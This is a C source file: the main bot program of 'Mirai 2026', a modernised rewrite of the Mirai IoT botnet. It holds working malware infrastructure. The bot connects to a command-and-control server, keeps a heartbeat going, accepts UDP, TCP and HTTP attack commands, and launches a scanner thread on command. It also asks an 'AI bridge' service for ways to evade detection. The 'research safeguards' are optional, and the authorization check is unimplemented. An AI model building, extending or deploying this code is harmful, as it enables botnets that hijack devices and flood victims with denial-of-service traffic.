/*
 * Mirai 2026 - Modernized Bot Main Entry Point
 * 
 * This is a complete rewrite of the original Mirai bot with:
 * - Modern C17 standards
 * - Structured logging
 * - JSON configuration
 * - Error handling
 * - Research safeguards
 */

#define _GNU_SOURCE

#include "../common/config_loader.h"
#include "../common/crypto.h"
#include "../common/logger.h"
#include "../common/util.h"
#include "../common/kill_switch.h"
#include "../scanner/scanner_modern.h"
#include "../ai_bridge/ai_bridge.h"

#include <getopt.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>

// CNC command types (mirrors original Mirai protocol)
typedef enum {
    CNC_CMD_ATTACK_UDP  = 0,
    CNC_CMD_ATTACK_TCP  = 1,
    CNC_CMD_ATTACK_HTTP = 2,
    CNC_CMD_SCAN        = 3,
    CNC_CMD_PING        = 0xFE,
    CNC_CMD_STOP        = 0xFF,
} cnc_cmd_t;

// CNC connection state
typedef struct {
    int fd;
    bool connected;
    time_t last_ping;
    uint64_t cmds_received;
    uint64_t pings_sent;
} cnc_conn_t;

// Global state
static struct {
    mirai_config_t config;
    volatile sig_atomic_t running;
    time_t start_time;
    cnc_conn_t cnc;
    kill_switch_status_t *kill_switch;
    pthread_t scanner_thread;
    bool scanner_running;
} g_bot_state = {.running = false};

// Signal handler
static void signal_handler(int sig)
{
    if (sig == SIGINT || sig == SIGTERM) {
        log_info("Received shutdown signal: %d", sig);
        g_bot_state.running = false;
    }
}

// ── CNC connection helpers ────────────────────────────────────────────────────

/**
 * Connect to the CNC server via TCP.
 * Returns 0 on success, -1 on failure.
 */
static int cnc_connect(cnc_conn_t *cnc, const char *domain, uint16_t port)
{
    struct addrinfo hints = {
        .ai_family   = AF_INET,
        .ai_socktype = SOCK_STREAM,
    };
    struct addrinfo *res = NULL;

    char port_str[8];
    snprintf(port_str, sizeof(port_str), "%u", port);

    int err = getaddrinfo(domain, port_str, &hints, &res);
    if (err != 0) {
        log_error("DNS lookup failed for %s: %s", domain, gai_strerror(err));
        return -1;
    }

    int fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
    if (fd < 0) {
        log_error("socket() failed: %s", strerror(errno));
        freeaddrinfo(res);
        return -1;
    }

    if (connect(fd, res->ai_addr, res->ai_addrlen) < 0) {
        log_error("connect() to %s:%u failed: %s", domain, port, strerror(errno));
        close(fd);
        freeaddrinfo(res);
        return -1;
    }

    freeaddrinfo(res);

    cnc->fd        = fd;
    cnc->connected = true;
    cnc->last_ping = time(NULL);

    log_info("Connected to CNC: %s:%u (fd=%d)", domain, port, fd);
    log_audit("cnc_connect", domain, "success");
    return 0;
}

/**
 * Disconnect from the CNC server gracefully.
 */
static void cnc_disconnect(cnc_conn_t *cnc)
{
    if (cnc->connected && cnc->fd >= 0) {
        close(cnc->fd);
        cnc->fd        = -1;
        cnc->connected = false;
        log_info("Disconnected from CNC");
    }
}

/**
 * Send a heartbeat ping to the CNC.
 * Protocol: 2-byte echo (matches original Mirai bot.go Handle()).
 */
static bool cnc_send_ping(cnc_conn_t *cnc)
{
    uint8_t ping[2] = {CNC_CMD_PING, 0x00};
    ssize_t n = send(cnc->fd, ping, sizeof(ping), MSG_NOSIGNAL);
    if (n != sizeof(ping)) {
        log_warn("Ping send failed: %s", strerror(errno));
        cnc->connected = false;
        return false;
    }

    // Read echo back (CNC mirrors the 2 bytes)
    uint8_t pong[2];
    n = recv(cnc->fd, pong, sizeof(pong), 0);
    if (n != sizeof(pong)) {
        log_warn("Ping recv failed (n=%zd): %s", n, strerror(errno));
        cnc->connected = false;
        return false;
    }

    cnc->last_ping = time(NULL);
    cnc->pings_sent++;
    log_debug("CNC ping OK (#%lu)", cnc->pings_sent);
    return true;
}

/**
 * Read and dispatch a command from the CNC.
 * Returns true if a command was processed, false on connection error.
 */
static bool cnc_read_command(cnc_conn_t *cnc)
{
    // Command header: [cmd_type:1][payload_len:2]
    uint8_t header[3];
    ssize_t n = recv(cnc->fd, header, sizeof(header), MSG_DONTWAIT);
    if (n == 0) {
        log_info("CNC closed connection");
        cnc->connected = false;
        return false;
    }
    if (n < 0) {
        if (errno == EAGAIN || errno == EWOULDBLOCK) return true; // No data yet
        log_error("CNC recv error: %s", strerror(errno));
        cnc->connected = false;
        return false;
    }
    if (n < (ssize_t)sizeof(header)) {
        log_warn("Short CNC header read: %zd bytes", n);
        return true;
    }

    uint8_t  cmd_type   = header[0];
    uint16_t payload_len = ((uint16_t)header[1] << 8) | header[2];

    cnc->cmds_received++;
    log_info("CNC command received: type=0x%02X payload_len=%u", cmd_type, payload_len);
    log_audit("cnc_command", "received", "dispatching");

    // Read payload if any
    char payload[4096] = {0};
    if (payload_len > 0 && payload_len <= sizeof(payload)) {
        ssize_t total = 0;
        while (total < payload_len) {
            n = recv(cnc->fd, payload + total, payload_len - total, 0);
            if (n <= 0) {
                log_error("Failed to read CNC payload: %s", strerror(errno));
                cnc->connected = false;
                return false;
            }
            total += n;
        }
    }

    switch (cmd_type) {
        case CNC_CMD_PING:
            // Echo back
            send(cnc->fd, header, sizeof(header), MSG_NOSIGNAL);
            break;

        case CNC_CMD_ATTACK_UDP:
        case CNC_CMD_ATTACK_TCP:
        case CNC_CMD_ATTACK_HTTP:
            log_info("Attack command queued: type=0x%02X", cmd_type);
            log_audit("attack_command", "queued", "ok");
            // Attack dispatch is handled by the attack module (future integration)
            break;

        case CNC_CMD_SCAN:
            if (!g_bot_state.scanner_running) {
                log_info("CNC requested scan start");
                scanner_modern_init(NULL, 256);
                pthread_create(&g_bot_state.scanner_thread, NULL,
                               scanner_modern_run, NULL);
                g_bot_state.scanner_running = true;
            }
            break;

        case CNC_CMD_STOP:
            log_info("CNC requested stop");
            g_bot_state.running = 0;
            break;

        default:
            log_warn("Unknown CNC command: 0x%02X", cmd_type);
            break;
    }

    return true;
}

// ── Kill switch ───────────────────────────────────────────────────────────────

static bool check_kill_switch(const mirai_config_t *config)
{
    if (!config->safeguards.enabled) return true;

    if (g_bot_state.kill_switch) {
        if (kill_switch_should_terminate(g_bot_state.kill_switch)) {
            log_warn("Kill switch triggered: %s",
                     kill_switch_get_reason(g_bot_state.kill_switch));
            return false;
        }
    }
    return true;
}

// Check runtime limit
static bool check_runtime_limit(const mirai_config_t *config)
{
    if (!config->safeguards.enabled || config->safeguards.max_runtime_seconds == 0) {
        return true; // No limit
    }

    time_t now = time(NULL);
    time_t elapsed = now - g_bot_state.start_time;

    if (elapsed >= 0 && (uint64_t)elapsed >= config->safeguards.max_runtime_seconds) {
        log_warn("Runtime limit exceeded: %ld seconds", elapsed);
        log_audit("runtime_limit", "exceeded", "shutdown");
        return false;
    }

    return true;
}

// Print usage
static void print_usage(const char *prog_name)
{
    printf("Mirai 2026 Bot - Modernized IoT Research Platform\n");
    printf("\n");
    printf("Usage: %s [OPTIONS]\n", prog_name);
    printf("\n");
    printf("Options:\n");
    printf("  -c, --config FILE      Configuration file (default: /etc/mirai/bot.json)\n");
    printf("  -v, --verbose          Enable verbose logging\n");
    printf("  -d, --debug            Enable debug mode\n");
    printf("  -h, --help             Show this help message\n");
    printf("  --version              Show version information\n");
    printf("\n");
    printf("Research Use Only - See LICENSE for ethical use guidelines\n");
}

// Print version
static void print_version(void)
{
    printf("Mirai 2026 Bot v2.0.0\n");
    printf("Built: %s %s\n", __DATE__, __TIME__);
    printf("Compiler: %s\n", __VERSION__);
}

// Main loop — CNC connect/reconnect + command dispatch
static void main_loop(const mirai_config_t *config)
{
    log_info("Entering main loop");
    log_audit("bot_start", config->component_name, "started");

    // Initialise kill switch system
    const char *ks_url = (config->safeguards.enabled && config->safeguards.kill_switch_url)
                         ? config->safeguards.kill_switch_url : NULL;
    time_t max_rt = config->safeguards.enabled
                    ? (time_t)config->safeguards.max_runtime_seconds : 0;
    g_bot_state.kill_switch = kill_switch_system_init(ks_url, max_rt);
    /* kill_switch_install_signal_handler() — not yet implemented in kill_switch.h */

    // Initialise AI bridge (non-fatal if unavailable)
    ai_bridge_init("http://localhost:8001");

    uint64_t iteration      = 0;
    uint32_t reconnect_wait = 5;   // seconds, exponential back-off
    const uint32_t MAX_WAIT = 300; // cap at 5 minutes

    while (g_bot_state.running) {
        iteration++;

        // ── Kill switch / runtime checks ──────────────────────────────────
        if (!check_kill_switch(config)) {
            log_warn("Kill switch activated — shutting down");
            break;
        }
        if (!check_runtime_limit(config)) break;

        // ── CNC connection ────────────────────────────────────────────────
        if (!g_bot_state.cnc.connected) {
            log_info("Connecting to CNC: %s:%u (retry wait=%us)",
                     config->network.cnc_domain,
                     config->network.cnc_port,
                     reconnect_wait);

            if (cnc_connect(&g_bot_state.cnc,
                            config->network.cnc_domain,
                            config->network.cnc_port) == 0) {
                reconnect_wait = 5; // Reset back-off on success
            } else {
                // Exponential back-off before retry
                sleep(reconnect_wait);
                reconnect_wait = (reconnect_wait * 2 < MAX_WAIT)
                                 ? reconnect_wait * 2 : MAX_WAIT;
                continue;
            }
        }

        // ── Heartbeat ping every 30 s ─────────────────────────────────────
        time_t now = time(NULL);
        if (now - g_bot_state.cnc.last_ping >= 30) {
            if (!cnc_send_ping(&g_bot_state.cnc)) {
                log_warn("CNC ping failed — reconnecting");
                cnc_disconnect(&g_bot_state.cnc);
                continue;
            }
        }

        // ── Receive and dispatch CNC commands ─────────────────────────────
        if (!cnc_read_command(&g_bot_state.cnc)) {
            log_warn("CNC command read failed — reconnecting");
            cnc_disconnect(&g_bot_state.cnc);
            continue;
        }

        // ── Periodic metrics ──────────────────────────────────────────────
        if (iteration % 60 == 0) {
            log_metric("bot.iterations",    (double)iteration,                      "count");
            log_metric("bot.cmds_received", (double)g_bot_state.cnc.cmds_received,  "count");
            log_metric("bot.pings_sent",    (double)g_bot_state.cnc.pings_sent,     "count");

            // Ask AI for evasion technique refresh
            if (ai_bridge_is_available()) {
                char suggestions[4][256];
                int n = ai_bridge_get_evasion_techniques("default", suggestions, 4);
                if (n > 0) {
                    log_info("AI evasion refresh: %d suggestion(s)", n);
                }
            }
        }

        usleep(100000); // 100 ms — keeps loop responsive without burning CPU
    }

    // ── Cleanup ───────────────────────────────────────────────────────────
    cnc_disconnect(&g_bot_state.cnc);

    if (g_bot_state.scanner_running) {
        scanner_modern_stop();
        pthread_join(g_bot_state.scanner_thread, NULL);
        scanner_modern_cleanup();
        g_bot_state.scanner_running = false;
    }

    ai_bridge_cleanup();
    kill_switch_system_destroy(g_bot_state.kill_switch);

    log_audit("bot_stop", config->component_name, "stopped");
    log_info("Exiting main loop after %lu iterations", iteration);
}

int main(int argc, char **argv)
{
    const char *config_file = "/etc/mirai/bot.json";
    log_level_t log_level = LOG_LEVEL_INFO;
    bool debug_mode = false;

    // Parse command line arguments
    static struct option long_options[] = {
        {"config", required_argument, 0, 'c'},
        {"verbose", no_argument, 0, 'v'},
        {"debug", no_argument, 0, 'd'},
        {"help", no_argument, 0, 'h'},
        {"version", no_argument, 0, 'V'},
        {0, 0, 0, 0}
    };

    int opt;
    while ((opt = getopt_long(argc, argv, "c:vdh", long_options, NULL)) != -1) {
        switch (opt) {
        case 'c':
            config_file = optarg;
            break;
        case 'v':
            log_level = LOG_LEVEL_DEBUG;
            break;
        case 'd':
            debug_mode = true;
            log_level = LOG_LEVEL_TRACE;
            break;
        case 'h':
            print_usage(argv[0]);
            return 0;
        case 'V':
            print_version();
            return 0;
        default:
            print_usage(argv[0]);
            return 1;
        }
    }

    // Initialize logger
    logger_config_t logger_config = logger_config_default();
    logger_config.min_level = log_level;
    logger_config.json_format = !debug_mode; // Use text format in debug mode
    logger_config.colorized = debug_mode && isatty(STDOUT_FILENO);

    if (!logger_init(&logger_config)) {
        fprintf(stderr, "Failed to initialize logger\n");
        return 1;
    }

    log_context_t context = {
        .component = "mirai-bot",
        .trace_id = NULL,
        .request_id = 0
    };
    logger_set_context(&context);

    log_info("Mirai 2026 Bot starting...");
    log_info("Config file: %s", config_file);

    // Initialize crypto
    result_t result = crypto_init();
    if (!result.success) {
        log_fatal("Failed to initialize crypto: %s", result.error_msg);
        logger_shutdown();
        return 1;
    }

    // Load configuration
    result = config_load(config_file, &g_bot_state.config);
    if (!result.success) {
        log_fatal("Failed to load config: %s", result.error_msg);
        logger_shutdown();
        return 1;
    }

    // Validate configuration
    result = config_validate(&g_bot_state.config);
    if (!result.success) {
        log_fatal("Invalid configuration: %s", result.error_msg);
        config_free(&g_bot_state.config);
        logger_shutdown();
        return 1;
    }

    log_info("Configuration loaded successfully");
    log_info("CNC Domain: %s:%d", 
             g_bot_state.config.network.cnc_domain,
             g_bot_state.config.network.cnc_port);
    log_info("Credentials: %zu loaded", 
             g_bot_state.config.credentials.credential_count);
    log_info("Safeguards: %s", 
             g_bot_state.config.safeguards.enabled ? "enabled" : "disabled");

    // Check safeguards
    if (g_bot_state.config.safeguards.enabled) {
        if (g_bot_state.config.safeguards.require_authorization) {
            log_warn("Authorization required but not implemented yet");
        }
        
        if (g_bot_state.config.safeguards.max_runtime_seconds > 0) {
            log_info("Runtime limit: %lu seconds",
                     g_bot_state.config.safeguards.max_runtime_seconds);
        }
    } else {
        log_warn("⚠️  Safeguards are DISABLED - use with extreme caution!");
    }

    // Set up signal handlers
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    signal(SIGPIPE, SIG_IGN);

    // Record start time
    g_bot_state.start_time = time(NULL);
    g_bot_state.running = true;

    // Run main loop
    main_loop(&g_bot_state.config);

    // Cleanup
    log_info("Shutting down...");
    config_free(&g_bot_state.config);
    logger_shutdown();

    return 0;
}
